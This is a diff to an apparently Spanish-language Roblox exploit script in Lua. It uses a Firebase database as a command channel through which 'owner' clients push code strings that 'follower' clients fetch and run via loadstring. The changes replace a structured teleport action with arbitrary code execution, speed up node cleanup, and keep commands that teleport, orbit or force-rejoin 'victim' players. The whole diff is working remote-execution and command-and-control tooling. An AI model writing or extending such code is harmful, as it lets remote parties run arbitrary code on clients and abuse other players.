@@ -44,32 +44,54 @@ task.spawn(function()
         return nil
     end
 
+    local function firebaseDelete(path)
+        local ok, result = pcall(function()
+            return request({
+                Url = FIREBASE_URL .. path .. ".json",
+                Method = "DELETE",
+                Headers = { ["Content-Type"] = "application/json" }
+            })
+        end)
+        if not ok or not result then return false end
+        local status = tonumber(result.StatusCode or result.Status or 0)
+        return status >= 200 and status < 300
+    end
+
     local function CleanupOldData(path)
         local data = firebaseRequest("GET", path)
-        if not data or type(data) ~= "table" then return end
+        if type(data) ~= "table" then return end
+
         local now = os.time()
         local maxAge = 60
+
+        local function CleanNode(node, nodePath)
+            if type(node) ~= "table" then return end
+
+            local timestamp = tonumber(node.timestamp)
+            if timestamp then
+                if now - timestamp >= maxAge then
+                    firebaseDelete(nodePath)
+                    return
+                end
+                return
+            end
+
+            local hasTableChild = false
+            for key, value in pairs(node) do
+                if type(value) == "table" then
+                    hasTableChild = true
+                    CleanNode(value, nodePath .. "/" .. tostring(key))
+                end
+            end
+
+            if not hasTableChild and nodePath ~= path then
+                firebaseDelete(nodePath)
+            end
+        end
+
         for key, entry in pairs(data) do
             if type(entry) == "table" then
-                if entry.timestamp then
-                    if (now - (entry.timestamp or 0)) > maxAge then
-                        firebaseRequest("DELETE", path .. "/" .. key)
-                    end
-                else
-                    local allOld = true
-                    for subKey, subEntry in pairs(entry) do
-                        if type(subEntry) == "table" and subEntry.timestamp then
-                            if (now - (subEntry.timestamp or 0)) > maxAge then
-                                firebaseRequest("DELETE", path .. "/" .. key .. "/" .. subKey)
-                            else
-                                allOld = false
-                            end
-                        end
-                    end
-                    if allOld then
-                        firebaseRequest("DELETE", path .. "/" .. key)
-                    end
-                end
+                CleanNode(entry, path .. "/" .. tostring(key))
             end
         end
     end
@@ -193,7 +215,7 @@ task.spawn(function()
         if not (isOwner or isAdmin) then return end
 
         while true do
-            task.wait(60)
+            task.wait(10)
             pcall(function()
                 CleanupOldData("/heartbeats")
                 CleanupOldData("/triggers")
@@ -214,9 +236,6 @@ task.spawn(function()
     local commandCooldown = 0.5
     local emoteSyncConnection = nil
     local targetForEmoteSync = nil
-    local lastCleanupTime = 0
-    local cleanupInterval = 300 
-
     pcall(function()
         local data = game:HttpGet("https://raw.githubusercontent.com/Joystickplays/AFEM/refs/heads/main/emotes.json")
         emotes = HttpService:JSONDecode(data)
@@ -1193,16 +1212,13 @@ task.spawn(function()
                                 local executionKey = tostring(ownerId) .. "/" .. tostring(execId)
                                 if type(execData) == "table" and not lastProcessedExecs[executionKey] then
                                     local target = tostring(execData.target or ""):lower()
-                                    local targetUserId = tostring(execData.targetUserId or "")
                                     local senderServerId = tostring(execData.serverId or "")
                                     local processedBy = type(execData.processed) == "table"
                                         and execData.processed[myUserId] ~= nil
 
                                     local shouldExecute = false
 
-                                    if targetUserId ~= "" and targetUserId == tostring(LocalPlayer.UserId) then
-                                        shouldExecute = true
-                                    elseif target == ".all" then
+                                    if target == ".all" then
                                         shouldExecute = true
                                     elseif target == ".s" then
                                         shouldExecute = senderServerId == currentServerId
@@ -1210,7 +1226,7 @@ task.spawn(function()
                                         shouldExecute = true
                                     end
 
-                                    if shouldExecute and not processedBy and (execData.code or execData.action == "teleport_to_server") then
+                                    if shouldExecute and not processedBy and execData.code then
                                         local sName = tostring(execData.sender_name or "")
                                         local sHwid = tostring(execData.sender_hwid or "")
                                         local verified = VerifySender(tostring(ownerId), sName, sHwid)
@@ -1225,16 +1241,8 @@ task.spawn(function()
                                             )
 
                                             pcall(function()
-                                                if execData.action == "teleport_to_server" then
-                                                    local placeId = tonumber(execData.placeId)
-                                                    local jobId = tostring(execData.jobId or "")
-                                                    if placeId and jobId ~= "" then
-                                                        TeleportService:TeleportToPlaceInstance(placeId, jobId, LocalPlayer)
-                                                    end
-                                                elseif execData.code then
-                                                    local func = loadstring(execData.code)
-                                                    if func then func() end
-                                                end
+                                                local func = loadstring(execData.code)
+                                                if func then func() end
                                             end)
                                         end
                                     end
@@ -1899,7 +1907,7 @@ task.spawn(function()
         end)
 
         local commands = {
-            {".traer [nombre/all]", "Traer al servidor actual a un cliente conectado en Firebase", false},
+            {".traer [nombre/all]", "Trae un cliente conectado en Firebase al servidor actual", false},
             {".t [Victima] [Objetivo]", "Teleport de la Victima a el Objetivo", true},
             {".rj [Victima/all]", "Rejoin: .rj=yo | .rj nombre=específico | .rj all=todos", false},
             {".u [Victima] [Objetivo]", "Haz orbitar la victima en el objetivo", true},
@@ -1994,49 +2002,81 @@ task.spawn(function()
 
             if cmdPrefix == ".traer" then
                 if not isOwner then return end
-                local objetivo = victimaArg
-                if not objetivo then return end
+                if not victimaArg then
+                    sendBtn.Text = "Usa .traer [nombre/all]"
+                    task.wait(1.2)
+                    sendBtn.Text = "Ejecutar"
+                    return
+                end
 
-                local heartbeats = firebaseRequest("GET", "/heartbeats")
-                if not heartbeats or type(heartbeats) ~= "table" then return end
+                local target = victimaArg
+                if target ~= "all" then
+                    local heartbeats = firebaseRequest("GET", "/heartbeats")
+                    local matchedName = nil
+                    local exactName = nil
+                    local now = os.time()
 
-                local ahora = os.time()
-                local enviados = 0
+                    if type(heartbeats) == "table" then
+                        for userId, entry in pairs(heartbeats) do
+                            if tostring(userId) ~= myUserId and type(entry) == "table" then
+                                local username = tostring(entry.username or "")
+                                local role = tostring(entry.role or "follower"):lower()
+                                local timestamp = tonumber(entry.timestamp) or 0
+                                if username ~= "" and role == "follower" and (now - timestamp) <= 60 then
+                                    local lowerName = username:lower()
+                                    if lowerName == target then
+                                        exactName = username
+                                        break
+                                    elseif lowerName:sub(1, #target) == target and not matchedName then
+                                        matchedName = username
+                                    end
+                                end
+                            end
+                        end
+                    end
+
+                    local selectedName = exactName or matchedName
+                    if not selectedName then
+                        sendBtn.Text = "Cliente no encontrado"
+                        task.wait(1.2)
+                        sendBtn.Text = "Ejecutar"
+                        return
+                    end
+                    target = selectedName:lower()
+                else
+                    target = ".all"
+                end
+
+                local teleportCode = "local ts=game:GetService('TeleportService');ts:TeleportToPlaceInstance("
+                    .. tostring(game.PlaceId) .. "," .. string.format("%q", tostring(game.JobId))
+                    .. ",game:GetService('Players').LocalPlayer)"
+                local execId = HttpService:GenerateGUID(false)
                 local myHwid = ""
                 pcall(function()
                     if gethwid then myHwid = tostring(gethwid())
                     elseif getdeviceid then myHwid = tostring(getdeviceid()) end
                 end)
 
-                for uid, data in pairs(heartbeats) do
-                    if type(data) == "table" then
-                        local nombre = tostring(data.username or "")
-                        local rol = tostring(data.role or ""):lower()
-                        local timestamp = tonumber(data.timestamp) or 0
-                        local conectado = (ahora - timestamp) < 60
-                        local esObjetivo = objetivo == "all" or nombre:lower():sub(1, #objetivo) == objetivo
+                local sent = firebaseRequest("PUT", "/executions/owners/" .. myUserId .. "/" .. execId, {
+                    code = teleportCode,
+                    target = target,
+                    sender_name = LocalPlayer.Name,
+                    sender_hwid = myHwid,
+                    serverId = currentServerId,
+                    timestamp = os.time()
+                })
 
-                        if conectado and esObjetivo and rol ~= "owner" and rol ~= "admin" then
-                            local execId = HttpService:GenerateGUID(false)
-                            firebaseRequest("PUT", "/executions/owners/" .. myUserId .. "/" .. execId, {
-                                targetUserId = tostring(uid),
-                                action = "teleport_to_server",
-                                placeId = game.PlaceId,
-                                jobId = game.JobId,
-                                sender_name = LocalPlayer.Name,
-                                sender_hwid = myHwid,
-                                timestamp = os.time()
-                            })
-                            enviados = enviados + 1
-                        end
-                    end
+                if not sent then
+                    sendBtn.Text = "Error al enviar"
+                    task.wait(1.2)
+                    sendBtn.Text = "Ejecutar"
+                    return
                 end
 
                 commandInput.Text = ""
-                local originalText = sendBtn.Text
-                sendBtn.Text = "✓ Enviado: " .. enviados
-                task.wait(1)
-                sendBtn.Text = originalText
+                sendBtn.Text = "✓ Traer enviado"
+                task.wait(1.2)
+                sendBtn.Text = "Ejecutar"
                 return
             end
 
@@ -2335,7 +2375,7 @@ task.spawn(function()
                     if gethwid then myHwid = tostring(gethwid())
                     elseif getdeviceid then myHwid = tostring(getdeviceid()) end
                 end)
-                firebaseRequest("PUT", "/executions/owners/" .. myUserId .. "/" .. execId, {
+                local result = firebaseRequest("PUT", "/executions/owners/" .. myUserId .. "/" .. execId, {
                     code        = code,
                     target      = target,
                     sender_name = LocalPlayer.Name,
